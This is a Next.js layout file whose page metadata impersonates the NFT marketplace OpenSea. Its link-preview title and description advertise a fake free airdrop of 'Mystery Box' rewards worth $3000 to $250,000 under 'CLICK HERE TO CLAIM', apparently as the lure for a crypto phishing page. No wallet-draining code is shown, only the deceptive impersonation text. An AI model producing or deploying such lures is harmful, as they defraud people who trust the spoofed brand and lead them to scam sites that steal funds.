import type { Metadata } from "next";
import React from "react";

export const metadata: Metadata = {
  title: "OpenSea.io",
  openGraph: {
    siteName: "This is an automatically generated announcement message",
    title: "CLICK HERE TO CLAIM",
    description:
      "🟢 AIRDROP IS LIVE NOW 🟢\n\n🎉 Price: FREE\n🎉 Supply: 150 Mystery Box\n🎉 Reward: between $3000 and $250,000\n\nTRY YOUR LUCK ! 🚀",
    images: [
      {
        url: "/app/api/box.gif",
      },
    ],
    type: "website",
  },
  themeColor: "#7289DA",
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="en-US" data-theme="light">
      <body>{children}</body>
    </html>
  );
}
